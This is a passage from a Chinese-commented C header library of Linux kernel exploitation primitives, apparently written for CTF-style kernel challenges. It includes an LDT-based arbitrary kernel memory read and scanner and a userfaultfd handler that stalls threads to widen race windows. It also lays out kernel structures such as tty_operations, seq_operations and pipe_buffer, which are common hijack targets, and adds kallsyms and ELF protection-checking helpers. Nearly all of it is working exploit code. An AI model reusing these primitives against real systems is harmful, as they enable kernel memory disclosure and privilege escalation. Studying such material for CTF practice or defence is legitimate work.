  ldt_momdifier(momdifier_args, addr);

  pipe(pipe_fd);
  if (!fork()) {
    // 子进程
    syscall(SYS_modify_ldt, 0, buf, 0x8000);
    write(pipe_fd[1], buf, 0x8000);
    exit(0);
  } else {
    // 父进程
    wait(NULL);
    read(pipe_fd[0], res_buf, 0x8000);
  }

  close(pipe_fd[0]);
  close(pipe_fd[1]);
}

/**
 * ldt_seeking_memory - 扫描内核内存以寻找目标内容
 *
 * 此函数每次读取 0x8000 字节数据，通过用户提供的 mem_finder()
 * 函数在读取的数据中查找目标内容，一旦找到则返回对应内核地址。
 *
 * 注意：应先调用 ldt_guessing_direct_mapping_area() 获取基地址。
 *
 * @ldt_momdifier: 修改 ldt_struct->entries 的函数
 * @momdifier_args: 传入的参数
 * @page_offset_base: 已泄露的 direct mapping 区基地址
 * @mem_finder: 查找函数，形如 size_t finder(void *args, char *buf)
 *              返回偏移，未找到返回 -1
 * @finder_args: 查找函数所需参数
 *
 * 返回值：目标内核地址，未找到则返回 -1
 */
size_t ldt_seeking_memory(void *(*ldt_momdifier)(void *, size_t),
                          void *momdifier_args, uint64_t page_offset_base,
                          size_t (*mem_finder)(void *, char *),
                          void *finder_args) {
  static char buf[0x8000];
  size_t search_addr = page_offset_base;
  size_t result_addr = -1, offset;

  log_info("开始遍历内核内存寻找目标内容...");
  while (1) {
    ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);

    offset = mem_finder(finder_args, buf);
    if (offset != (size_t)-1) {
      result_addr = search_addr + offset;
      log_success("内容匹配成功！目标地址 = 0x%lx", result_addr);
      break;
    }

    search_addr += 0x8000;
  }

  return result_addr;
}

/*
8. 与 userfaultfd 利用相关的代码
 */

/**
 * 有时候我们使用 MUSL-GCC 编译时，MUSL 并不提供 `userfaultfd.h`。
 * 不过我们只需要少量结构和宏定义用于漏洞利用，所以直接定义在这里即可 :)
 */

#define UFFD_API ((uint64_t)0xAA)
#define _UFFDIO_REGISTER (0x00)
#define _UFFDIO_COPY (0x03)
#define _UFFDIO_API (0x3F)

/* userfaultfd ioctl ids */
#define UFFDIO 0xAA
#define UFFDIO_API _IOWR(UFFDIO, _UFFDIO_API, struct uffdio_api)
#define UFFDIO_REGISTER _IOWR(UFFDIO, _UFFDIO_REGISTER, struct uffdio_register)
#define UFFDIO_COPY _IOWR(UFFDIO, _UFFDIO_COPY, struct uffdio_copy)

/* read() structure */
struct uffd_msg {
  uint8_t event;

  uint8_t reserved1;
  uint16_t reserved2;
  uint32_t reserved3;

  union {
    struct {
      uint64_t flags;
      uint64_t address;
      union {
        uint32_t ptid;
      } feat;
    } pagefault;

    struct {
      uint32_t ufd;
    } fork;

    struct {
      uint64_t from;
      uint64_t to;
      uint64_t len;
    } remap;

    struct {
      uint64_t start;
      uint64_t end;
    } remove;

    struct {
      /* unused reserved fields */
      uint64_t reserved1;
      uint64_t reserved2;
      uint64_t reserved3;
    } reserved;
  } arg;
} __attribute__((packed));

#define UFFD_EVENT_PAGEFAULT 0x12

struct uffdio_api {
  uint64_t api;
  uint64_t features;
  uint64_t ioctls;
};

struct uffdio_range {
  uint64_t start;
  uint64_t len;
};

struct uffdio_register {
  struct uffdio_range range;
#define UFFDIO_REGISTER_MODE_MISSING ((uint64_t)1 << 0)
#define UFFDIO_REGISTER_MODE_WP ((uint64_t)1 << 1)
  uint64_t mode;
  uint64_t ioctls;
};

struct uffdio_copy {
  uint64_t dst;
  uint64_t src;
  uint64_t len;
#define UFFDIO_COPY_MODE_DONTWAKE ((uint64_t)1 << 0)
  uint64_t mode;
  int64_t copy;
};

// #include <linux/userfaultfd.h>

char temp_page_for_stuck[0x1000];

/**
 * register_userfaultfd - 注册 userfaultfd 并绑定处理线程
 *
 * @monitor_thread: 输出参数，指向被创建的监控线程对象
 * @addr: 被监控的起始地址
 * @len: 被监控区域长度
 * @handler: 页错误触发时的处理函数
 */
void register_userfaultfd(pthread_t *monitor_thread, void *addr,
                          unsigned long len, void *(*handler)(void *)) {
  long uffd;
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  /* Create and enable userfaultfd object */
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1) {
    err_exit("userfaultfd");
  }

  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
    err_exit("ioctl-UFFDIO_API");
  }

  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
    err_exit("ioctl-UFFDIO_REGISTER");
  }

  s = pthread_create(monitor_thread, NULL, handler, (void *)uffd);
  if (s != 0) {
    err_exit("pthread_create");
  }
}

/**
 * uffd_handler_for_stucking_thread - 模拟卡住的线程处理函数
 *
 * @args: userfaultfd 的描述符
 *
 * 当 userfaultfd 触发 pagefault
 * 事件时，该线程休眠等待，以模拟“卡住”的执行状态。
 */
void *uffd_handler_for_stucking_thread(void *args) {
  struct uffd_msg msg;
  int fault_cnt = 0;
  long uffd;

  struct uffdio_copy uffdio_copy;
  ssize_t nread;

  uffd = (long)args;

  for (;;) {
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);

    if (nready == -1) {
      err_exit("poll");
    }

    nread = read(uffd, &msg, sizeof(msg));

    /* just stuck there is okay... */
    sleep(100000000);

    if (nread == 0) {
      err_exit("EOF on userfaultfd!\n");
    }

    if (nread == -1) {
      err_exit("read");
    }

    if (msg.event != UFFD_EVENT_PAGEFAULT) {
      err_exit("Unexpected event on userfaultfd\n");
    }

    uffdio_copy.src = (unsigned long long)temp_page_for_stuck;
    uffdio_copy.dst =
        (unsigned long long)msg.arg.pagefault.address & ~(0x1000 - 1);
    uffdio_copy.len = 0x1000;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
      err_exit("ioctl-UFFDIO_COPY");
    }

    return NULL;
  }
}

/**
 * register_userfaultfd_for_thread_stucking - 封装 userfaultfd
 * 注册与卡死处理器注册流程
 *
 * @monitor_thread: 指向线程对象的指针
 * @buf: 被监控的内存区域地址
 * @len: 被监控区域的长度
 */
void register_userfaultfd_for_thread_stucking(pthread_t *monitor_thread,
                                              void *buf, unsigned long len) {
  register_userfaultfd(monitor_thread, buf, len,
                       uffd_handler_for_stucking_thread);
}

/**
9. 内核结构
 */

struct file;
struct file_operations;
struct tty_struct;
struct tty_driver;
struct serial_icounter_struct;
struct ktermios;
struct termiox;
struct seq_operations;

struct seq_file {
  char *buf;
  size_t size;
  size_t from;
  size_t count;
  size_t pad_until;
  loff_t index;
  loff_t read_pos;
  uint64_t lock[4]; // struct mutex lock;
  const struct seq_operations *op;
  int poll_event;
  const struct file *file;
  void *Private; // 实际为 void *private , private与C++关键字冲突
};

struct seq_operations {
  void *(*start)(struct seq_file *m, loff_t *pos);
  void (*stop)(struct seq_file *m, void *v);
  void *(*next)(struct seq_file *m, void *v, loff_t *pos);
  int (*show)(struct seq_file *m, void *v);
};

struct tty_operations {
  struct tty_struct *(*lookup)(struct tty_driver *driver, struct file *filp,
                               int idx);
  int (*install)(struct tty_driver *driver, struct tty_struct *tty);
  void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
  int (*open)(struct tty_struct *tty, struct file *filp);
  void (*close)(struct tty_struct *tty, struct file *filp);
  void (*shutdown)(struct tty_struct *tty);
  void (*cleanup)(struct tty_struct *tty);
  int (*write)(struct tty_struct *tty, const unsigned char *buf, int count);
  int (*put_char)(struct tty_struct *tty, unsigned char ch);
  void (*flush_chars)(struct tty_struct *tty);
  int (*write_room)(struct tty_struct *tty);
  int (*chars_in_buffer)(struct tty_struct *tty);
  int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
  long (*compat_ioctl)(struct tty_struct *tty, unsigned int cmd,
                       unsigned long arg);
  void (*set_termios)(struct tty_struct *tty, struct ktermios *old);
  void (*throttle)(struct tty_struct *tty);
  void (*unthrottle)(struct tty_struct *tty);
  void (*stop)(struct tty_struct *tty);
  void (*start)(struct tty_struct *tty);
  void (*hangup)(struct tty_struct *tty);
  int (*break_ctl)(struct tty_struct *tty, int state);
  void (*flush_buffer)(struct tty_struct *tty);
  void (*set_ldisc)(struct tty_struct *tty);
  void (*wait_until_sent)(struct tty_struct *tty, int timeout);
  void (*send_xchar)(struct tty_struct *tty, char ch);
  int (*tiocmget)(struct tty_struct *tty);
  int (*tiocmset)(struct tty_struct *tty, unsigned int set, unsigned int clear);
  int (*resize)(struct tty_struct *tty, struct winsize *ws);
  int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
  int (*get_icount)(struct tty_struct *tty,
                    struct serial_icounter_struct *icount);
  void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
  int (*poll_init)(struct tty_driver *driver, int line, char *options);
  int (*poll_get_char)(struct tty_driver *driver, int line);
  void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
  const struct file_operations *proc_fops;
};

struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from len to offset, write start from offset */
struct pipe_buffer {
  struct page *page;
  unsigned int offset, len;
  const struct pipe_buf_operations *ops;
  unsigned int flags;
  unsigned long Private; // 实际为 unsigned long private ,
                         // private与C++关键字冲突
};

struct pipe_buf_operations {
  /*
   * ->confirm() 用于确认 pipe 缓冲区中的数据是可用且有效的。
   * 如果缓冲区中的页面属于某个文件系统，我们可能需要在此钩子中等待 I/O 完成。
   * 返回值为 0 表示数据有效，返回负值表示错误。
   * 如果未实现该函数，内核将默认所有页面都是有效的。
   */
  int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);

  /*
   * 当 pipe 缓冲区中的数据被读者完全消费后，会调用 ->release()。
   * 通常用于释放或清理与该缓冲区相关的资源。
   */
  void (*release)(struct pipe_inode_info *, struct pipe_buffer *);

  /*
   * 尝试“窃取”pipe 缓冲区及其内容的所有权。
   * ->try_steal() 返回 true（非
   * 0）表示成功，此时缓冲区所指的页被锁定并完全归调用者所有。
   * 调用者可以将该页面插入到其他地址空间（最常见的用法是插入到文件页缓存中）。
   */
  int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);

  /*
   * 获取对 pipe 缓冲区的引用。
   * 通常用于增加引用计数，防止缓冲区被过早释放。
   */
  int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};

/*
10. 内核符号表相关
*/

#define SYMBOL_NAME_MAX 128
#define HASH_TABLE_SIZE 8192

/* 符号表项结构体 */
typedef struct SymbolEntry {
  char name[SYMBOL_NAME_MAX]; /* 符号名 */
  size_t address;             /* 地址 */
  struct SymbolEntry *next;   /* 链式哈希冲突处理 */
} SymbolEntry;

/* 哈希表结构体 */
typedef struct {
  SymbolEntry *buckets[HASH_TABLE_SIZE];
} SymbolTable;

/* 全局静态符号表 */
static SymbolTable symbol_table;
static int initialized = 0;

/**
 * kallsyms_hash - 计算符号名的哈希值
 *
 * @name: 符号名字符串
 *
 * 返回值:
 *   哈希值索引
 */
unsigned long kallsyms_hash(const char *name) {
  unsigned long hash = 5381;
  int c;

  while ((c = *name++))
    hash = ((hash << 5) + hash) + c;

  return hash % HASH_TABLE_SIZE;
}

/**
 * kallsyms_insert - 插入符号项到哈希表
 *
 * @name: 符号名
 * @address: 地址
 */
void kallsyms_insert(const char *name, size_t address) {
  unsigned long index = kallsyms_hash(name);
  SymbolEntry *entry = (SymbolEntry *)malloc(sizeof(SymbolEntry));

  if (!entry)
    err_exit("malloc failed when inserting symbol: %s", name);

  strncpy(entry->name, name, SYMBOL_NAME_MAX - 1);
  entry->name[SYMBOL_NAME_MAX - 1] = '\0';
  entry->address = address;
  entry->next = symbol_table.buckets[index];
  symbol_table.buckets[index] = entry;
}

/**
 * symbol - 读取并解析 /tmp/kallsyms 构建符号表
 *
 * @filePath: kallsyms 文件路径
 */
void kallsyms_init(const char *filePath) {
  if (initialized)
    return;

  FILE *file = fopen(filePath, "r");
  if (!file)
    err_exit("无法打开符号文件: %s", filePath);

  char line[256];
  char name[SYMBOL_NAME_MAX], type;
  size_t address;

  while (fgets(line, sizeof(line), file)) {
    if (sscanf(line, "%zx %c %127s", &address, &type, name) == 3)
      kallsyms_insert(name, address);
  }

  fclose(file);
  initialized = 1;
  log_success("符号表构建完成");
}

/**
 * find_symbol - 查找符号名对应的地址
 *
 * @funName: 符号名
 *
 * 返回值：
 *  >0 - 函数地址
 *  =0 - 未找到
 */
size_t kallsyms_find(const char *funName) {
  unsigned long index = kallsyms_hash(funName);
  SymbolEntry *curr = symbol_table.buckets[index];

  while (curr) {
    if (strcmp(curr->name, funName) == 0)
      return curr->address;
    curr = curr->next;
  }

  return 0;
}

/*
11. elf符号表相关
*/

/* ELF 相关静态状态 */
static Elf *elf = NULL;
static int elf_fd = -1;
static size_t symtab_ndx = 0;
static Elf_Data *symtab_data = NULL;
static GElf_Shdr symtab_shdr;

/**
 * elf_find_symbol - 查找符号地址
 *
 * @symbol_name: 符号名
 *
 * 返回值：
 *   >0 符号地址（st_value）
 *   =0 找不到
 */
size_t elf_find_symbol(const char *symbol_name) {
  if (!elf || !symtab_data) {
    log_error("符号表未初始化");
    return 0;
  }

  for (size_t i = 0; i < symtab_ndx; i++) {
    GElf_Sym sym;
    if (gelf_getsym(symtab_data, (int)i, &sym) != &sym)
      continue;

    const char *name = elf_strptr(elf, symtab_shdr.sh_link, sym.st_name);

    if (name && strcmp(name, symbol_name) == 0) {
      log_success("%s 地址 0x%zx", symbol_name, (size_t)sym.st_value);
      return (size_t)sym.st_value;
    }
  }

  return 0;
}

/**
 * elf_symbol_print - 打印 ELF 文件基本信息和保护机制
 */
void elf_symbol_print(void) {
  GElf_Ehdr ehdr;

  if (!elf || gelf_getehdr(elf, &ehdr) != &ehdr) {
    log_error("无法读取 ELF 头部");
    return;
  }

  /* 打印基本信息 */
  const char *class_str =
      (gelf_getclass(elf) == ELFCLASS64) ? "ELF64" : "ELF32";
  const char *arch_str = "unknown";

  switch (ehdr.e_machine) {
  case EM_X86_64:
    arch_str = "x86_64";
    break;
  case EM_386:
    arch_str = "x86";
    break;
  case EM_ARM:
    arch_str = "ARM";
    break;
  case EM_AARCH64:
    arch_str = "AArch64";
    break;
  default:
    arch_str = "未知";
    break;
  }

  log_info("ELF 文件类型 : %s", class_str);
  log_info("架构         : %s", arch_str);
  log_info("入口点地址   : 0x%zx", (size_t)ehdr.e_entry);

  /* 动态链接标识 */
  size_t phnum;
  int is_dynamic = 0;

  if (elf_getphdrnum(elf, &phnum) == 0 && phnum > 0)
    is_dynamic = 1;

  log_info("是否动态链接 : %s", is_dynamic ? "是" : "否");

  /* ========== ELF 保护机制 ========== */

  /* PIE 检测 */
  int is_pie = (ehdr.e_type == ET_DYN);

  /* NX 检测（PT_GNU_STACK） */
  int has_nx = 1;
  for (size_t i = 0; i < phnum; i++) {
    GElf_Phdr phdr;
    if (gelf_getphdr(elf, i, &phdr) != &phdr)
      continue;
    if (phdr.p_type == PT_GNU_STACK) {
      if (phdr.p_flags & PF_X)
        has_nx = 0;
      break;
    }
  }

  /* RELRO / BIND_NOW 检测 */
  int has_relro = 0, has_bindnow = 0;
  Elf_Scn *scn = NULL;
  while ((scn = elf_nextscn(elf, scn)) != NULL) {
    GElf_Shdr shdr;
    if (gelf_getshdr(scn, &shdr) != &shdr)
      continue;

#ifndef SHT_GNU_VERNEED
#define SHT_GNU_VERNEED 0x6ffffffe
#endif

#ifndef SHT_GNU_VERDEF
#define SHT_GNU_VERDEF 0x6ffffffd
#endif

    /* 简单判断 */
    if (shdr.sh_type == SHT_GNU_VERNEED || shdr.sh_type == SHT_GNU_VERDEF)
      has_relro = 1;
    if (shdr.sh_type == SHT_RELA || shdr.sh_type == SHT_REL)
      has_bindnow = 1;
  }

  /* Canary 检测 */
  int has_canary = (elf_find_symbol("__stack_chk_fail") != 0);

  /* 打印保护信息 */
  log_protection("PIE", is_pie);
  log_protection("NX", has_nx);
  log_protection("Canary", has_canary);
  log_protection("RELRO", has_relro);
  log_protection("BIND_NOW", has_bindnow);
}

/**
 * elf_symbol_init - 加载 ELF 文件并解析符号表
 *
 * @elf_path: ELF 文件路径
 */
void elf_symbol_init(const char *elf_path) {
  if (elf != NULL) {
    log_info("符号表已初始化，无需重复加载");
    return;
  }

  if (elf_version(EV_CURRENT) == EV_NONE)
    err_exit("libelf 初始化失败");

  elf_fd = open(elf_path, O_RDONLY);
  if (elf_fd < 0)
    err_exit("无法打开 ELF 文件: %s", elf_path);

  elf = elf_begin(elf_fd, ELF_C_READ, NULL);
  if (!elf)
    err_exit("elf_begin 失败: %s", elf_errmsg(-1));

  size_t shstrndx;
  if (elf_getshdrstrndx(elf, &shstrndx) != 0)
    err_exit("elf_getshdrstrndx 失败: %s", elf_errmsg(-1));

  Elf_Scn *scn = NULL;
  while ((scn = elf_nextscn(elf, scn)) != NULL) {
    GElf_Shdr shdr;
    if (gelf_getshdr(scn, &shdr) != &shdr)
      continue;

    if (shdr.sh_type == SHT_SYMTAB || shdr.sh_type == SHT_DYNSYM) {
      symtab_data = elf_getdata(scn, NULL);
      symtab_ndx = shdr.sh_size / shdr.sh_entsize;
      symtab_shdr = shdr;
      log_success("加载符号表成功，符号数: %zu", symtab_ndx);
      elf_symbol_print();
      return;
    }
  }

  err_exit("未找到符号表段");
}

/**
 * elf_symbol_cleanup - 清理 ELF 状态
 */
void elf_symbol_cleanup(void) {
  if (elf) {
    elf_end(elf);
    elf = NULL;
  }
  if (elf_fd >= 0) {
    close(elf_fd);
    elf_fd = -1;
  }
  symtab_data = NULL;
  symtab_ndx = 0;
}

#endif
